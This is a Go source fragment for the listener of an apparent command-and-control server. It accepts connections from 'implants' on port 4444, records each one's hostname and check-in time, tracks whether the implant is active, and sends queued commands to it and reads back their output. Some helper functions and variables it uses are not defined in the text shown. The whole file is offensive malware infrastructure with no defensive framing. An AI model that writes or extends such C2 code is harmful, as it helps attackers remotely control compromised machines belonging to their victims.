package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"
	"time"
)

type implantID struct {
	Hostname string
	LastSeen int
}

var implant implantID

var lastSeen time.Time

func initalizeServer() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println("[-] Error accepting connection")
			continue
		}

		go handleImplants(conn)
	}
}

func checkImplantStatus() string {

	for {
		time.Sleep(10 * time.Second)
		if time.Since(lastSeen) > 30*time.Second {
			fmt.Println("\n[!] Implant hasn't checked in")
		} else {
			fmt.Println("\n[+] Implant active, last seen:", lastSeen)
		}
	}
}

func GetHostname(reader *bufio.Reader) string {
	hostname, err := reader.ReadString('\n')
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(hostname)

}

func handleImplants(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	hostname := GetHostname(reader)
	lastSeen = time.Now()
	implant = implantID{
		Hostname: hostname,
	}

	if pendingCommand != "" {
		sendCommands(conn)
		pendingCommand = ""
		receiveOutput(reader)
	}
}
